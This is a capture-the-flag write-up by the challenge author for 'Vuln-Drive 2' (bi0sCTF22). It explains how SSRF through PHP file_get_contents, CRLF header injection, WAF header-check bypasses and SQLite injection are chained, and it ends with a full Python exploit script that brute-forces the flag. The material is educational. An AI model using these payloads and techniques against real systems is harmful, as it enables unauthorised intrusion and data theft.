---
title: Vuln-Drive 2 - bi0sCTF22
date: 2023-01-24 23:18:58
author: ma1f0y
author_url: https://twitter.com/mal_f0y
categories:
  - Web
tags:
  - bi0sCTF22
  - SSRF
  - SQLi
  - CRLF
  
---

**tl;dr**

- SSRF using file_get_contents() and CRLF  in ini_set()
- basic Header quirks to bypass waf
- sqli using column trick in SQLite to get the flag 

<!--more-->

**Challenge Points**: 964 
**No. of solves**: 10

## Challenge Description

This year we build a new Drive application for you. I think it's better than last year's.

Download the source from [link](https://github.com/teambi0s/bi0sCTF/tree/main/2022/Web/vuln_drive_2)





## Analysis

The best way to start with the challenge was to analyze the source code provided.

Going through the source we have a docker-compose.yml file, which has three service in it namely `frontend`,`waf`,`app`

```yaml=
services:
  frontend:
    build: ./php
    ports:
      - 8000:80
    ...
    networks:
      - frontend

  waf:
    build: ./waf
    networks:
      - frontend
      - backend
   ...
      on-failure
  app:
    build: ./app
    environment:
      - FLAG=fakeflag
    networks:
      - backend
    ...
networks:
  frontend:
  backend:    
```

The frontend is exposed on port 8000, which we can access directly and the network structure is like frontend can access the waf and only waf can access the app which has the flag. So the goal of the challenge was to access app through waf from the frontend and get the flag, as simple as that!!. But it was not as easy as we think.

Now we will go through exploiting each service one by one to get the flag.

## Frontend

The frontend service is a PHP application, which can do the following:
- login.php - Login with a username, which will be stored in the session
- index.php - create a new folder(name we can control) and upload files to a folder
- view.php - view uploaded file by filename

while logging in, the application will create a folder under the name `./uploads/session_id()` to which we can create folders and uploads files later and that folder location will be stored in `session['folder']`.

When we create a new folder or upload file there is a `check_name` function to check whether the file/folder name has any path traversal characters like `.` or `/` etc.


there is also a `.htaccess`  file in uploads directory which is preventing us from accessing uploaded files directly. so if we can upload `.php` file (which is possible because there is no check on extension while uploading the file) we won't be able to access it directly

Our goal is to somehow access the waf service, so basically we need to get [SSRF]( https://portswigger.net/web-security/ssrf). If you know about PHP, one of the interesting vectors for SSRF in PHP is `file_get_contents()`.Other than filepaths this function also accepts URL as an argument. Grep for the function in the source and in `view.php` 

```php=
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $ext = explode('.', $file);
    $type = substr(strtolower(end($ext)),0,3);
    $file = $FOLDER."/".$file;
    if($type==="txt"){
        try {
            if(file_exists($file)){
                chdir($FOLDER);
                echo file_get_contents($_GET['file']);
```

There is file_get_contents with GET `file` parameter as input, can we give URL in file parameter?

Yes, But we have to pass the file_exists check, and type check to reach the file_get_contents. The file_exists check is done on our session folder, after that the  application will change directory to our session folder and calls file_get_contents on the file parameter. So we can construct URL using folder and file names inside our session folder.

So to construct the protocol part of url we can just create a folder named `http:` inside our directory and we can give `http://filename` in file parameter. Then \$file will become `$FOLDER/http://filename`  which is the same as `$FOLDER/http:/filename`  and will pass the file_exists check.

The next challenge is that if we want to send requests to a WAF, the hostname(after the protocol) of the URL must be set to `waf`.However, after the protocol, we have to give a valid filename in that directory to pass the file_exists check. So we can't directly give `http://waf`.

```php=
if($fileSize < 100000){
                $name = uniqid('', true).".".$fileActualExt;
                $fileDestination = $FOLDER.$_POST['path'];
                upload($file['tmp_name'], $fileDestination,$name);
                header("Location: index.php?uploadsuccess");
            }else{
                $error =  "Your file is too big!";
                }
```

We cannot control the filename because it's a unique name created by the application itself when uploading the file, But we can control the extension of the filename. We can give`@waf` in the extension to get SSRF as the rest of the part before the `@` will be treated as the username part of the URL. To pass the type check we can give `txt@waf` as an extension as the check is only done for the first three characters of the extension.
so the URL will look like `http://filename.txt@waf`

Another thing to note is that, In the utils.php, there is `ini_set('from',SESSION['username'])` in the report function, which is vulnerable to [CRLF injection](https://bugs.php.net/bug.php?id=81680), using that we can get header injection. As this file is included in the view.php we just have to trigger the report() function by giving an invalid folder name.

## WAF

The waf service is a go web application that will proxy requests to the app service when the path is `/`. It has some headers checks which we have to bypass.

In app we can see that we have to pass the below Header checks to get the main functionality of the app 
```python
if request.headers.get("X-pro-hacker")=="Pro-hacker" and "gimme" in request.headers.get("flag")
```
we have to pass `X-pro-hacker` header with the value `Pro-hacker` and `flag` header with the value `gimme` in it as the check is using `in` operator.

But in waf the check is the following:

```go
if(r.Header.Get("X-pro-hacker")!=""){
     fmt.Fprintf(w, "Hello Hacker!\n")
     return
}
if(strings.Contains(r.Header.Get("flag"), "gimme")){
    fmt.Fprintf(w, "No flag For you!\n")
    return
}
```

we are not allowed to pass any value in `X-pro-hacker` header and `flag` header should not contain the word `gimme`.

To bypass the checks :

* Use `X_pro-hacker` as the header name instead of `X-pro-hacker`. When the requests get to the Flask app the `_` will be normalized to `-`.[Reference](https://github.security.telekom.com/2020/05/smuggling-http-headers-through-reverse-proxies.html)
*  we can send two `flag` headers and set the value `gimme` in the second header as r.Header.Get("flag") only gets the value of the first header. But in the Flask app, it will concat the values of headers with the same name using `,`.


## app

This was the last part of the challenge. The `app` service was a Flask app with only one endpoint `/`, which only accepts GET requests. As mentioned above we can get pass the header checks in the app

There is an init_db() function that is used to initialize the database

```sql=
 CREATE TABLE IF NOT EXISTS users  (
                                        username  TEXT, 
                                        token TEXT
                                    );
CREATE TABLE IF NOT EXISTS flag  (
                                    flag_is_here  TEXT
                                 );                                                  
Delete from users;
Delete from flag;
INSERT INTO users values ('user','some_randomtoken'),
                         ('admi','some_randomtoken'),
                         (
                            'admin',
                            '{FLAG}'
                         );
INSERT INTO flag values ('{FLAG}');
```

we can see the flag is the both `users` table and `flag` table. our goal is to leak the flag from the database.


```python=
if request.headers.get("Token"):         
                token = request.headers.get("Token")
                token = token[:16]
                token = token.replace(" ","").replace('"',"")
                if request.form.get("user"):
                    user = request.form.get("user")
                    user = user[:38]
                    add_user(user,token)            
                query = f'SELECT * FROM users WHERE token="{token}"'
                res = db_query(query)
                res = res.fetchone()
                return res[1] if res and len(res[0])>0  else "INDEX\n"
        except Exception as e:
            print(e) 
    return "INDEX\n"
```
The application will take the `token` header and fetch data from the database. Only 16 characters are allowed in the token. And if there is form data with `user` parameter, the application will call add_user funcition with the user and token. Here only 38 characters are allowed in the user parameter. If there is a matching token in the database and has a username it will return token from the database.

In Flask we can send form data in the body of GET request, we just have to add the header `Content-Type: application/x-www-form-urlencoded` in the request.



```python=
def add_user(user,token):
    q = f"INSERT INTO users values ('{user}','{token}')"
    db_query(q)
    return
```
In the add_user() function, there is  SQL injection possible. We can use the user parameter to inject the sqli payload, because token is used to retrieve data from the database. Using the following payload we can add a user with token as the character of the flag 

`a',substr((select*from flag),1,1));--`

This payload is well inside the character limit.

Then we can just use the token to brute the flag character by character, when the right character is found the application will return the same, and `INDEX\n` is returned otherwise. Thus we can leak the flag.

## Exploit

```python=
import requests
import re
import string 

#url = "http://localhost:8000"
url = "http://web.chall.bi0s.in:8000"

S = requests.Session()
S.get(url)
S.post(url+'/login.php',data = {"username": "asdf","submit":"submit"} )
S.get(url+'/index.php?new=http:')
S.post(url+"/index.php",files={"file":('asdf.txt@waf','abc.txt')}, data={"submit":"submit","path":"http:"})

files= S.get(url+"/view.php?fol=http:").text
file = re.findall("<a href='(.*?)'>",files)
file = f"http://{file[0].replace('/view.php?file=http:/','')}"
print(file)

payload = """hello
Host: localhost
X-pro_hacker: Pro-hacker
Token: {}
flag: hello
flag: gimme
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

user=a',substr((select*from flag),{},1));--"""
flag = ""

for i in range(1,10):
    for letter in "1234567890abcdef":
        print("Trying....", letter)
        p = payload.format(letter,str(i))
        data = {"username": p.replace("\n","\r\n"),"submit":"submit"}

        S.post(url+'/login.php',data = data )

        res = S.get(url+f"/view.php?fol=.&file={file}").text

        match = re.findall("not found</div>(.)",res)[0]
        #print(res)
        if letter == match:
            flag += letter
            print(flag)
            break

```

## flag

`bi0sctf{dfae5409d}`

## conclusion

This challenge includes chaining different interesting vulnerabilities and tricks in different services together to get the flag. It was really fun and took me a lot of time to make the challenge. I learned a lot while making this challenge. Hope everyone enjoyed it :)

















